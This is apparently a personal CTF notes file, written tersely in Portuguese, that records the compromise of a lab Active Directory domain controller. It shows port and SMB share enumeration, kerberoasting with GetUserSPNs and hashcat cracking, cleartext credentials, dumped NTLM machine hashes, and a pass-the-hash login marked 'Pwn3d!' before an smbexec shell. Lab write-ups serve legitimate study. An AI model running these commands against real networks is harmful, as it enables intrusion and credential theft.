@@ -1,0 +1,122 @@
+10.201.110.50
+
+53/tcp    open  domain           syn-ack ttl 124
+88/tcp    open  kerberos-sec     syn-ack ttl 124
+135/tcp   open  msrpc            syn-ack ttl 124
+139/tcp   open  netbios-ssn      syn-ack ttl 124
+389/tcp   open  ldap             syn-ack ttl 124
+445/tcp   open  microsoft-ds     syn-ack ttl 124
+464/tcp   open  kpasswd5         syn-ack ttl 124
+593/tcp   open  http-rpc-epmap   syn-ack ttl 124
+636/tcp   open  ldapssl          syn-ack ttl 124
+3268/tcp  open  globalcatLDAP    syn-ack ttl 124
+3269/tcp  open  globalcatLDAPssl syn-ack ttl 124
+3389/tcp  open  ms-wbt-server    syn-ack ttl 124
+9389/tcp  open  adws             syn-ack ttl 124
+49664/tcp open  unknown          syn-ack ttl 124
+49667/tcp open  unknown          syn-ack ttl 124
+49673/tcp open  unknown          syn-ack ttl 124
+49708/tcp open  unknown          syn-ack ttl 124
+49802/tcp open  unknown          syn-ack ttl 124
+
+Sharename       Type      Comment
+---------       ----      -------
+ADMIN$          Disk      Remote Admin
+backup          Disk
+C$              Disk      Default share
+IPC$            IPC       Remote IPC
+NETLOGON        Disk      Logon server share
+SYSVOL          Disk      Logon server share
+Users           Disk
+
+
+DNS_Domain_Name: SOUPEDECODE.LOCAL
+DNS_Computer_Name: DC01.SOUPEDECODE.LOCAL
+
+IPC$ share Guest read
+
+SMB         10.201.110.50   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
+SMB         10.201.110.50   445    DC01             [+] SOUPEDECODE.LOCAL\guest:
+SMB         10.201.110.50   445    DC01             [*] Enumerated shares
+SMB         10.201.110.50   445    DC01             Share           Permissions     Remark
+SMB         10.201.110.50   445    DC01             -----           -----------     ------
+SMB         10.201.110.50   445    DC01             ADMIN$                          Remote Admin
+SMB         10.201.110.50   445    DC01             backup
+SMB         10.201.110.50   445    DC01             C$                              Default share
+SMB         10.201.110.50   445    DC01             IPC$            READ            Remote IPC
+SMB         10.201.110.50   445    DC01             NETLOGON                        Logon server share
+SMB         10.201.110.50   445    DC01             SYSVOL                          Logon server share
+SMB         10.201.110.50   445    DC01             Users
+
+
+User enumartio possivle por causa que temos permissao de leitra no IPC$.
+
+SMB         10.201.110.50   445    DC01             [+] SOUPEDECODE.LOCAL\ybob317:ybob317
+Creds:
+ybob317:ybob317
+
+Enumerando shares com novo usuairo encontrado
+SMB         10.201.110.50   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
+SMB         10.201.110.50   445    DC01             [+] SOUPEDECODE.LOCAL\ybob317:ybob317
+SMB         10.201.110.50   445    DC01             [*] Enumerated shares
+SMB         10.201.110.50   445    DC01             Share           Permissions     Remark
+SMB         10.201.110.50   445    DC01             -----           -----------     ------
+SMB         10.201.110.50   445    DC01             ADMIN$                          Remote Admin
+SMB         10.201.110.50   445    DC01             backup
+SMB         10.201.110.50   445    DC01             C$                              Default share
+SMB         10.201.110.50   445    DC01             IPC$            READ            Remote IPC
+SMB         10.201.110.50   445    DC01             NETLOGON        READ            Logon server share
+SMB         10.201.110.50   445    DC01             SYSVOL          READ            Logon server share
+SMB         10.201.110.50   445    DC01             Users           READ
+
+Enumerando contas de services (kerberoasting):
+GetUSerSPNS.py domain/user:pass -dc-ip <ip> -request -output out.txt
+FTP/FileServer          file_svc                  2024-06-17 14:32:23.726085  <never>
+FW/ProxyServer          firewall_svc              2024-06-17 14:28:32.710125  <never>
+HTTP/BackupServer       backup_svc                2024-06-17 14:28:49.476511  <never>
+HTTP/WebServer          web_svc                   2024-06-17 14:29:04.569417  <never>
+HTTPS/MonitoringServer  monitoring_svc            2024-06-17 14:29:18.511871  <never>
+
+Querando com hashcat
+hashcat -a0 -m13100 hashes.txt /usr/share/wordlists/rockyou.txt --show
+
+Cracked:
+file_svc:Password123!!
+
+Enumrando shares com file_svc
+
+SMB         10.201.110.50   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
+SMB         10.201.110.50   445    DC01             [+] SOUPEDECODE.LOCAL\file_svc:Password123!!
+SMB         10.201.110.50   445    DC01             [*] Enumerated shares
+SMB         10.201.110.50   445    DC01             Share           Permissions     Remark
+SMB         10.201.110.50   445    DC01             -----           -----------     ------
+SMB         10.201.110.50   445    DC01             ADMIN$                          Remote Admin
+SMB         10.201.110.50   445    DC01             backup          READ
+SMB         10.201.110.50   445    DC01             C$                              Default share
+SMB         10.201.110.50   445    DC01             IPC$            READ            Remote IPC
+SMB         10.201.110.50   445    DC01             NETLOGON        READ            Logon server share
+SMB         10.201.110.50   445    DC01             SYSVOL          READ            Logon server share
+SMB         10.201.110.50   445    DC01             Users
+
+WebServer$:2119:aad3b435b51404eeaad3b435b51404ee:c47b45f5d4df5a494bd19f13e14f7902:::
+DatabaseServer$:2120:aad3b435b51404eeaad3b435b51404ee:406b424c7b483a42458bf6f545c936f7:::
+CitrixServer$:2122:aad3b435b51404eeaad3b435b51404ee:48fc7eca9af236d7849273990f6c5117:::
+FileServer$:2065:aad3b435b51404eeaad3b435b51404ee:e41da7e79a4c76dbd9cf79d1cb325559:::
+MailServer$:2124:aad3b435b51404eeaad3b435b51404ee:46a4655f18def136b3bfab7b0b4e70e3:::
+BackupServer$:2125:aad3b435b51404eeaad3b435b51404ee:46a4655f18def136b3bfab7b0b4e70e3:::
+ApplicationServer$:2126:aad3b435b51404eeaad3b435b51404ee:8cd90ac6cba6dde9d8038b068c17e9f5:::
+PrintServer$:2127:aad3b435b51404eeaad3b435b51404ee:b8a38c432ac59ed00b2a373f4f050d28:::
+ProxyServer$:2128:aad3b435b51404eeaad3b435b51404ee:4e3f0bb3e5b6e3e662611b1a87988881:::
+MonitoringServer$:2129:aad3b435b51404eeaad3b435b51404ee:48fc7eca9af236d7849273990f6c5117:::
+
+PTH attack
+nxc smb doman.loacl -u user.txt -H hashes.txt --no-brute
+SMB         10.201.110.50   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
+SMB         10.201.110.50   445    DC01             [-] SOUPEDECODE.LOCAL\WebServer$:c47b45f5d4df5a494bd19f13e14f7902 STATUS_LOGON_FAILURE
+SMB         10.201.110.50   445    DC01             [-] SOUPEDECODE.LOCAL\DatabaseServer$:406b424c7b483a42458bf6f545c936f7 STATUS_LOGON_FAILURE
+SMB         10.201.110.50   445    DC01             [-] SOUPEDECODE.LOCAL\CitrixServer$:48fc7eca9af236d7849273990f6c5117 STATUS_LOGON_FAILURE
+SMB         10.201.110.50   445    DC01             [+] SOUPEDECODE.LOCAL\FileServer$:e41da7e79a4c76dbd9cf79d1cb325559 (Pwn3d!)
+
+smbexec para conseiguir uma shell no DC.
+
+Concluido!
